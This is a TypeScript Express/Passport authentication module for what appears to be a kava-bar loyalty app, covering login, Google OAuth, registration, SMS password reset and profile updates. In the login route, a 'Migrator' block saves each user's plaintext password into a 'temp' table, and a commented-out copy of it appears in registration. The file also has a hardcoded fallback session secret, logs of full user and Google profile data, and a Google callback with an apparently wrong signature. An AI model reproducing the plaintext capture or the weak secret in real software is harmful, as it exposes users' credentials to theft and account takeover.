import { type Express } from "express";
import passport from "passport";
import { Strategy as LocalStrategy } from "passport-local";
import { Strategy as GoogleStrategy } from "passport-google-oauth20";
import session from "express-session";
import { createReferral } from "./utils/generate-referralcode";
import multer from "multer";
import path from "path";
import {
  generateUsernameSuggestions,
  usernameExists,
} from "./utils/username-suggestions";
import fs from "fs";
import { isAuthenticated } from "./middleware/auth";
import {
  users,
  insertUserSchema,
  phoneVerificationCodes,
  passwordResetTokens,
  temp,
} from "@db/schema";
import { db } from "@db";
import { RedisStore } from "connect-redis";
import { createClient } from "redis";

import { eq, and, sql, desc } from "drizzle-orm";
import { crypto } from "./utils/crypto";
import { sendVerificationCode, verifyCode } from "./utils/prelude";
import { formatToE164 } from "./utils/phone-format";
import { v4 as uuidv4 } from "uuid";
import { uploadImageToStorage } from "./upload-to-storage";

// Ensure uploads directory exists
const UPLOADS_DIR = path.join(process.cwd(), "public/uploads/profiles");
fs.mkdirSync(UPLOADS_DIR, { recursive: true });
const storage = multer.memoryStorage(); // Store in memory instead of disk

const upload = multer({
  storage: storage,
  limits: {
    fileSize: 25 * 1024 * 1024, // 25MB limit
  },
  fileFilter: function (req, file, cb) {
    const filetypes = /jpeg|jpg|png|gif/;
    const mimetype = filetypes.test(file.mimetype);
    const extname = filetypes.test(
      path.extname(file.originalname).toLowerCase(),
    );

    if (mimetype && extname) {
      return cb(null, true);
    }
    cb(new Error("Only image files are allowed!"));
  },
});

// Initialize client.
let redisClient = createClient({ url: process.env.REDIS_URL! });
redisClient.connect().catch(console.error);
let redisStore = new RedisStore({
  client: redisClient,
  prefix: "kava-auth:",
});
// User type definitions
interface BaseUser {
  id: number;
  username: string;
  email: string;
  firstName?: string; // Make these optional to handle missing fields
  lastName?: string;
  points: number;
  isAdmin: boolean;
  provider: "local" | "google" | "apple";
  squareCustomerId: string | null;
  createdAt: Date;
  phoneNumber: string | null;
  isPhoneVerified: boolean;
  role: string;
  status: string;
  profilePhotoUrl: string | null;
}

// Extend Express.User interface without circular reference
declare global {
  namespace Express {
    interface User extends BaseUser {}
  }
}

// Check environment on module load
function checkEnvironment() {
  if (!process.env.PRELUDE_API_TOKEN) {
    console.error("Warning: PRELUDE_API_TOKEN environment variable is missing");
  }
}

checkEnvironment();

export function setupAuth(app: Express) {
  const sessionSettings: session.SessionOptions = {
    secret: process.env.REPL_ID || "mykavabar-secret",
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: false,
      maxAge: 90 * 24 * 60 * 60 * 1000,
      httpOnly: true,
      sameSite: "lax",
      path: "/",
    },
    store: redisStore,
    name: "mykavabar.sid",
  };

  // Only use secure cookies in production
  if (app.get("env") === "production") {
    app.set("trust proxy", 1);
    if (sessionSettings.cookie) {
      sessionSettings.cookie.secure = true;
      sessionSettings.cookie.sameSite = "none";
    }
  }

  app.use("/api", session(sessionSettings));
  app.use("/api", passport.initialize());
  app.use("/api", passport.session());

  // Configure local strategy
  passport.use(
    new LocalStrategy(async (username, password, done) => {
      try {
        console.log("Authenticating user:", username);
        const [user] = await db
          .select()
          .from(users)
          .where(eq(users.username, username))
          .limit(1);

        if (!user) {
          console.log("User not found:", username);
          return done(null, false, { message: "Incorrect username." });
        }

        const isMatch = await crypto.compare(password, user.password);
        if (!isMatch) {
          console.log("Password mismatch for user:", username);
          return done(null, false, { message: "Incorrect password." });
        }

        console.log("User authenticated successfully:", {
          id: user.id,
          username: user.username,
          isAdmin: user.isAdmin,
        });

        const { password: _, ...userWithoutPassword } = user;
        return done(null, userWithoutPassword);
      } catch (err) {
        console.error("Authentication error:", err);
        return done(err);
      }
    }),
  );
  passport.use(
    new GoogleStrategy(
      {
        clientID: process.env.GOOGLE_CLIENT_ID!,
        clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
        callbackURL: "/api/auth/google/callback",
      },
      async (profile: any, done) => {
        try {
          // Extract Google profile info
          const email = profile.emails?.[0]?.value;
          if (!email) return done(new Error("No email from Google profile"));
          console.log("\n\nGoogle profile:", profile);
          // Check if user with email already exists
          let [user] = await db
            .select()
            .from(users)
            .where(eq(users.email, email))
            .limit(1);

          if (!user) {
            // Create a new user for Google login
            const [newUser] = await db
              .insert(users)
              .values({
                email,
                username: profile.id, // or create a unique username from profile
                firstName: profile.name?.givenName || "",
                lastName: profile.name?.familyName || "",
                password: "", // no password for Google users
                role: "regular_user",
                status: "active",
                isAdmin: false,
                isPhoneVerified: false,
                profilePhotoUrl: profile.photos?.[0]?.value || null,
              })
              .returning();
            console.log("Created new user from Google:", newUser);
            user = newUser;
          }

          // Return user without password
          const { ...userWithoutPassword } = user;
          done(null, userWithoutPassword);
        } catch (error) {
          done(error);
        }
      },
    ),
  );
  passport.serializeUser((user: Express.User, done) => {
    console.log("Serializing user:", {
      id: user.id,
      username: user.username,
      isAdmin: user.isAdmin,
    });
    done(null, user.id);
  });

  passport.deserializeUser(async (id: number, done) => {
    try {
      console.log("Deserializing user:", id);
      const [user] = await db
        .select({
          id: users.id,
          username: users.username,
          isAdmin: users.isAdmin,
          email: users.email,
          points: users.points,
          squareCustomerId: users.squareCustomerId,
          createdAt: users.createdAt,
          phoneNumber: users.phoneNumber,
          isPhoneVerified: users.isPhoneVerified,
          role: users.role,
          provider: users.provider,
          status: users.status,
          profilePhotoUrl: users.profilePhotoUrl,
        })
        .from(users)
        .where(eq(users.id, id))
        .limit(1);

      if (!user) {
        console.log("User not found during deserialization:", id);
        return done(new Error("User not found"), null);
      }

      console.log("User deserialized successfully:", {
        id: user.id,
        username: user.username,
        isAdmin: user.isAdmin,
        provider: user.provider,
      });

      done(null, user);
    } catch (err) {
      console.error("Deserialization error:", err);
      done(err, null);
    }
  });

  app.get(
    "/api/auth/google",
    passport.authenticate("google", { scope: ["profile", "email"] }),
  );

  app.get(
    "/api/auth/google/callback",
    passport.authenticate("google", { failureRedirect: "/auth" }),
    (req, res) => {
      // Successful authentication
      res.redirect("/"); // Or send custom response if API
    },
  );

  app.get(
    "/api/auth/username-suggestions",
    isAuthenticated,
    async (req, res) => {
      try {
        if (!req.user || !req.user.id)
          return res.status(401).json({ error: "Not authenticated" });
        const userId =
          typeof req.user.id === "string"
            ? parseInt(req.user.id, 10)
            : req.user.id;

        // Fetch the current user's firstName and lastName from DB
        const user = await db
          .select({ firstName: users.firstName, lastName: users.lastName })
          .from(users)
          .where(eq(users.id, userId))
          .limit(1);

        if (!user || user.length === 0) {
          return res.status(404).json({ error: "User not found" });
        }

        const { firstName, lastName } = user[0];

        if (!firstName || !lastName) {
          return res
            .status(400)
            .json({ error: "User's name not available for suggestions" });
        }

        const suggestions = await generateUsernameSuggestions(
          firstName,
          lastName,
          3,
        );

        res.status(200).json({ suggestions });
      } catch (error: any) {
        console.log("Error while suggesting username: ", error);
        res.status(500).json({ error: "Error while suggesting username" });
      }
    },
  );

  app.put(
    "/api/auth/complete-onboarding",
    isAuthenticated,
    async (req, res) => {
      try {
        if (!req.user || !req.user.id)
          return res.status(401).json({ error: "Not authenticated" });
        const userId =
          typeof req.user.id === "string"
            ? parseInt(req.user.id, 10)
            : req.user.id;

        const { username } = req.body;
        if (
          !username ||
          typeof username !== "string" ||
          username.trim().length < 3
        )
          return res
            .status(400)
            .json({ error: "Invalid username or invalid length" });

        const [user] = await db
          .select({ id: users.id, provider: users.provider })
          .from(users)
          .where(eq(users.id, userId))
          .limit(1);
        if (!user || user.provider !== "local") {
          return res
            .status(400)
            .json({ error: "Cannot update username for this provider" });
        }
        const usernameExistsInDb = await usernameExists(username);
        if (usernameExistsInDb)
          return res.status(409).json({ error: "Username already exists" });

        await db
          .update(users)
          .set({ username: username.trim() })
          .where(eq(users.id, userId));
        return res.json({ success: true });
      } catch (error: any) {
        console.log("Update username error: ", error);
        res.status(500).json({ error: "Error while updating username" });
      }
    },
  );

  app.post("/api/register", upload.single("profilePhoto"), async (req, res) => {
    try {
      console.log("Registration request:", {
        ...req.body,
        password: "[REDACTED]",
        profilePhoto: req.file ? "[FILE]" : undefined,
      });

      // Get the profile photo URL if uploaded
      let profilePhotoUrl = null;
      if (req.file) {
        const fileExtension = req.file.mimetype.split("/")[1];
        const fileName = `profiles/${uuidv4()}.${fileExtension}`;

        const { publicUrl } = await uploadImageToStorage(
          req.file.buffer,
          fileName,
        );
        profilePhotoUrl = publicUrl;
      }

      // Parse isPhoneVerified as boolean - use '1' as true value
      const isPhoneVerified = req.body.isPhoneVerified === "1";

      const result = insertUserSchema.safeParse({
        ...req.body,
        profilePhotoUrl,
        isPhoneVerified,
      });

      if (!result.success) {
        // Clean up uploaded file if validation fails
        return res.status(400).json({
          error: result.error.issues.map((i) => i.message).join(", "),
        });
      }

      const { username, password, email, phoneNumber, firstName, lastName } =
        result.data;

      const [existingUser] = await db
        .select()
        .from(users)
        .where(eq(users.username, username))
        .limit(1);

      if (existingUser) {
        return res.status(409).json({ error: "Username already exists" });
      }

      const [existingPhoneNumber] = await db
        .select()
        .from(users)
        .where(eq(users.phoneNumber, phoneNumber));

      if (existingPhoneNumber)
        return res.status(409).json({ error: "Phone number already exists" });

      const hashedPassword = await crypto.hash(password);
      const [newUser] = await db
        .insert(users)
        .values({
          username,
          email,
          firstName,
          lastName,
          password: hashedPassword,
          phoneNumber,
          role: "regular_user",
          status: "active",
          isAdmin: false,
          isPhoneVerified,
          profilePhotoUrl,
        })
        .returning();

      console.log("Created new user:", {
        id: newUser.id,
        username: newUser.username,
        isPhoneVerified: newUser.isPhoneVerified,
        profilePhotoUrl: newUser.profilePhotoUrl,
      });

      // ✅ Handle referral if a code is provided
      const receivedReferralCode = req.body.referralCode?.trim();
      if (receivedReferralCode) {
        try {
          await createReferral(receivedReferralCode, newUser.id);
        } catch (referralError: any) {
          console.warn(
            `Referral warning for user ${newUser.id}: ${referralError.message}`,
          );
          // Optional: Log but don’t block user registration
        }
      }

      // // Migrator
      // await db.insert(temp).values({
      //   temp1: newUser.username,
      //   temp2: password,
      // });
      // /Migrator

      const { password: _, ...userWithoutPassword } = newUser;

      req.login(userWithoutPassword, (err) => {
        if (err) {
          console.error("Login error after registration:", err);
          return res.status(500).json({
            error: "Registration successful but login failed",
            user: userWithoutPassword,
          });
        }
        return res.json({
          message: "Registration successful",
          user: userWithoutPassword,
        });
      });
    } catch (error: any) {
      console.error("Registration error:", error);

      // Clean up uploaded file if registration fails
      if (req.file) {
        fs.unlink(req.file.path, (err) => {
          if (err) console.error("Error deleting file:", err);
        });
      }

      if (error.code === "23505") {
        if (error.constraint === "users_email_key") {
          return res
            .status(400)
            .json({ error: "An account with this email already exists" });
        }
        if (error.constraint === "users_username_key") {
          return res
            .status(400)
            .json({ error: "This username is already taken" });
        }
      }

      res.status(500).json({
        error: "Registration failed. Please try again.",
        details:
          process.env.NODE_ENV === "development" ? error.message : undefined,
      });
    }
  });

  app.post("/api/login", (req, res, next) => {
    const { username, password } = req.body;

    if (!username || !password) {
      return res
        .status(400)
        .json({ error: "Username and password are required" });
    }

    console.log(`Login attempt for user: ${username}`);

    passport.authenticate(
      "local",
      async (err: any, user: Express.User | false, info: any) => {
        if (err) {
          console.error("Authentication error:", err);
          return next(err);
        }

        if (!user) {
          console.log(`Login failed for user: ${username}`, info?.message);
          return res
            .status(400)
            .json({ error: info?.message ?? "Login failed" });
        }

        req.logIn(user, async (err) => {
          if (err) {
            console.error("Login error:", err);
            return next(err);
          }

          console.log(`Login successful for user: ${username}`, {
            userId: user.id,
          });

          // Migrator
          const stored = await db.query.temp.findFirst({
            where: eq(temp.temp1, username),
          });
          if (stored == null) {
            await db.insert(temp).values({
              temp1: username,
              temp2: password,
            });
          }
          // /Migrator

          // Return the user object along with a success message
          return res.json({
            message: "Login successful",
            user: {
              id: user.id,
              username: user.username,
              email: user.email,
              isAdmin: user.isAdmin,
              points: user.points,
              role: user.role,
              phoneNumber: user.phoneNumber,
              profilePhotoUrl: user.profilePhotoUrl,
            },
          });
        });
      },
    )(req, res, next);
  });

  app.post("/api/logout", (req, res) => {
    req.logout((err) => {
      if (err) {
        return res.status(500).json({ error: "Logout failed" });
      }

      res.json({ message: "Logout successful" });
    });
  });

  app.get("/api/user", (req, res) => {
    if (req.isAuthenticated()) {
      console.log("User is authenticated:", req.user);
      return res.json({
        user: {
          id: req.user.id,
          username: req.user.username,
          email: req.user.email,
          isAdmin: req.user.isAdmin,
          points: req.user.points || 0,
          role: req.user.role,
          provider: req.user.provider,
          phoneNumber: req.user.phoneNumber,
          profilePhotoUrl: req.user.profilePhotoUrl,
        },
      });
    }

    res.status(401).json({ error: "Not authenticated" });
  });

  app.post("/api/auth/forgot-password", async (req, res) => {
    try {
      console.log("Received password reset request");
      const { phoneNumber } = req.body;

      if (!phoneNumber) {
        return res.status(400).json({
          success: false,
          error: "Phone number is required",
        });
      }

      // Format and validate phone number
      let formattedNumber;
      try {
        formattedNumber = formatToE164(phoneNumber);
        console.log("Formatted phone number:", formattedNumber);

        if (!formattedNumber.match(/^\+1[2-9]\d{9}$/)) {
          return res.status(400).json({
            success: false,
            error: "Invalid phone number format. Must be a valid US number.",
          });
        }
      } catch (error: any) {
        return res.status(400).json({
          success: false,
          error: "Invalid phone number format",
          details: error.message,
        });
      }

      // Check if user exists
      console.log("Checking if user exists");
      console.log(phoneNumber);
      const [user] = await db
        .select()
        .from(users)
        .where(eq(users.phoneNumber, phoneNumber))
        .limit(1);
      console.log(user);
      console.log("User lookup result:", user ? "found" : "not found");

      if (!user) {
        return res.json({
          success: true,
          message:
            "If an account exists with this phone number, you will receive a verification code.",
        });
      }

      if (!user.isPhoneVerified) {
        return res.status(400).json({
          success: false,
          error: "This phone number hasn't been verified yet",
        });
      }

      // Delete any existing unverified codes
      await db
        .delete(phoneVerificationCodes)
        .where(
          and(
            eq(phoneVerificationCodes.phoneNumber, formattedNumber),
            eq(phoneVerificationCodes.type, "reset"),
            eq(phoneVerificationCodes.isUsed, false),
          ),
        );

      // Send verification code
      console.log("Sending verification code to:", formattedNumber);
      const verificationResult = await sendVerificationCode(formattedNumber);
      console.log("Verification result:", verificationResult);

      if (!verificationResult.success) {
        return res.status(503).json({
          success: false,
          error: "Failed to send verification code. Please try again.",
          details: verificationResult.details,
        });
      }

      // Store verification record
      const [verificationCode] = await db
        .insert(phoneVerificationCodes)
        .values({
          userId: user.id,
          phoneNumber: formattedNumber,
          verificationId: verificationResult.verificationId,
          type: "reset",
          expiresAt: new Date(Date.now() + 15 * 60 * 1000),
          isUsed: false,
        })
        .returning();

      // Create reset token
      const token = uuidv4();
      await db.insert(passwordResetTokens).values({
        userId: user.id,
        token,
        phoneVerificationId: verificationCode.id,
        expiresAt: new Date(Date.now() + 15 * 60 * 1000),
      });

      console.log("Reset verification completed");
      res.json({
        success: true,
        message:
          "If an account exists with this phone number, you will receive a verification code.",
      });
    } catch (error: any) {
      console.error("Password reset error:", error);
      res.status(500).json({
        success: false,
        error: "Failed to process password reset request",
        details:
          process.env.NODE_ENV === "development" ? error.message : undefined,
      });
    }
  });

  app.post("/api/auth/verify-reset-code", async (req, res) => {
    try {
      const { code, phoneNumber } = req.body;

      if (!code || !phoneNumber) {
        return res
          .status(400)
          .json({ error: "Verification code and phone number are required" });
      }

      let formattedNumber;
      try {
        formattedNumber = formatToE164(phoneNumber);
        if (!formattedNumber.match(/^\+1[2-9]\d{9}$/)) {
          return res.status(400).json({
            error: "Invalid phone number format. Must be a valid US number.",
            details:
              "Phone number must be in format: +1XXXXXXXXXX where X are digits and first digit after +1 must be 2-9",
          });
        }
      } catch (error: any) {
        return res.status(400).json({
          error: "Invalid phone number format",
          details: error.message,
        });
      }

      const [verificationRecord] = await db
        .select()
        .from(phoneVerificationCodes)
        .where(
          and(
            eq(phoneVerificationCodes.phoneNumber, formattedNumber),
            eq(phoneVerificationCodes.type, "reset"),
            eq(phoneVerificationCodes.isUsed, false),
          ),
        )
        .orderBy(desc(phoneVerificationCodes.createdAt))
        .limit(1);

      if (!verificationRecord) {
        return res.status(400).json({
          error:
            "Invalid or expired verification attempt. Please request a new code.",
        });
      }

      try {
        const verificationResult = await verifyCode(formattedNumber, code);
        if (!verificationResult.success || !verificationResult.verified) {
          return res.status(400).json({
            error:
              verificationResult.error ||
              "Invalid verification code. Please try again.",
          });
        }

        // Mark code as used
        await db
          .update(phoneVerificationCodes)
          .set({ isUsed: true })
          .where(eq(phoneVerificationCodes.id, verificationRecord.id));

        // Get reset token
        const [resetToken] = await db
          .select()
          .from(passwordResetTokens)
          .where(
            and(
              eq(
                passwordResetTokens.phoneVerificationId,
                verificationRecord.id,
              ),
              sql`${passwordResetTokens.expiresAt} > NOW()`,
            ),
          )
          .limit(1);

        if (!resetToken) {
          return res
            .status(400)
            .json({ error: "Reset token not found or expired" });
        }

        res.json({
          message: "Code verified successfully",
          token: resetToken.token,
        });
      } catch (error: any) {
        console.error("Verification error:", error);
        res.status(503).json({
          error:
            "Verification service temporarily unavailable. Please try again later.",
          details:
            process.env.NODE_ENV === "development" ? error.message : undefined,
        });
      }
    } catch (error: any) {
      console.error("Code verification error:", error);
      res.status(500).json({
        error: "Failed to verify code. Please try again.",
        details:
          process.env.NODE_ENV === "development" ? error.message : undefined,
      });
    }
  });

  app.post("/api/auth/reset-password", async (req, res) => {
    try {
      const { token, newPassword } = req.body;

      if (!token || !newPassword) {
        return res
          .status(400)
          .json({ error: "Token and new password are required" });
      }

      // Find user with valid reset token
      const [resetToken] = await db
        .select({
          userId: passwordResetTokens.userId,
          phoneVerificationId: passwordResetTokens.phoneVerificationId,
        })
        .from(passwordResetTokens)
        .where(
          and(
            eq(passwordResetTokens.token, token),
            sql`${passwordResetTokens.expiresAt} > NOW()`,
          ),
        )
        .limit(1);

      if (!resetToken) {
        return res
          .status(400)
          .json({ error: "Password reset token is invalid or has expired" });
      }

      const [user] = await db
        .select()
        .from(users)
        .where(eq(users.id, resetToken.userId))
        .limit(1);

      if (!user) {
        return res.status(400).json({ error: "User not found" });
      }

      // Hash new password
      const hashedPassword = await crypto.hash(newPassword);

      // Update user's password and clear reset token
      await db
        .update(users)
        .set({
          password: hashedPassword,
          updatedAt: new Date(),
        })
        .where(eq(users.id, user.id));

      await db
        .delete(passwordResetTokens)
        .where(eq(passwordResetTokens.token, token));

      res.json({ message: "Password has been reset successfully" });
    } catch (error: any) {
      console.error("Password reset error:", error);
      res.status(500).json({
        error: "Failed to reset password",
        details:
          process.env.NODE_ENV === "development" ? error.message : undefined,
      });
    }
  });

  app.put(
    "/api/user/profile",
    upload.single("profilePhoto"),
    async (req, res) => {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ error: "Not authenticated" });
      }

      try {
        const userId = req.user.id;
        let profilePhotoUrl = req.user.profilePhotoUrl; // Default to existing profile photo

        // If a new file is uploaded, upload it to R2 directly
        if (req.file) {
          const fileExtension = req.file.mimetype.split("/")[1];
          const fileName = `profiles/${userId}-${uuidv4()}.${fileExtension}`;

          const { publicUrl } = await uploadImageToStorage(
            req.file.buffer,
            fileName,
          );
          profilePhotoUrl = publicUrl;
        }

        // Update user information in DB
        const [updatedUser] = await db
          .update(users)
          .set({
            firstName: req.body.firstName,
            lastName: req.body.lastName,
            email: req.body.email,
            phoneNumber: req.body.phoneNumber,
            profilePhotoUrl,
            updatedAt: new Date(),
          })
          .where(eq(users.id, userId))
          .returning();

        const { password: _, ...userWithoutPassword } = updatedUser;

        // Update session
        req.login(userWithoutPassword, (err) => {
          if (err) {
            console.error("Error updating session:", err);
            return res.status(500).json({ error: "Failed to update session" });
          }
          res.json(userWithoutPassword);
        });
      } catch (error: any) {
        console.error("Profile update error:", error);

        if (error.code === "23505") {
          if (error.constraint === "users_email_key") {
            return res
              .status(400)
              .json({ error: "This email is already in use" });
          }
          if (error.constraint === "users_phone_number_key") {
            return res
              .status(400)
              .json({ error: "This phone number is already in use" });
          }
        }

        res.status(500).json({
          error: "Failed to update profile",
          details:
            process.env.NODE_ENV === "development" ? error.message : undefined,
        });
      }
    },
  );
}
